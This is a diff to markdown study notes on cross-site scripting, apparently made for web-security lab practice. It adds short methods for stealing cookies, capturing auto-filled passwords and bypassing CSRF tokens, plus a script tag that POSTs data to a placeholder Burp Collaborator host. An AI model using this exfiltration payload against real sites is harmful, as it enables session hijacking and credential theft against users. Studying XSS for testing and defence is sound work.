@@ -1,4 +1,3 @@
-
 Cross-site scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious JavaScript code into a website, causing it to execute in another user's browser.
 
 ### XSS types:
@@ -8,13 +7,21 @@ Cross-site scripting (XSS) is a web security vulnerability that allows an attack
 	  - **Test every entry point.**
 	    
 
-
 ### Ways to Exploit cross-site scripting
-- **Steal cookies** - 
-- **capture passwords** - 
-- **bypass CSRF protections** - 
+- **Steal cookies** - stealing cookies by sending victim cookies to your own domain
+- **capture passwords** - create a password input, reading out the auto-filled password, and send it to your own domain
+- **bypass CSRF protections** - use XSS to read the victim's CSRF token from the page and then send a valid request using that token
 
 
 
 ### Cross-site scripting (XSS) cheat sheet:
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+**javaScript fetch:**
+<script> 
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { 
+method: 'POST', 
+mode: 'no-cors', 
+body: <body>
+}); 
+</script>
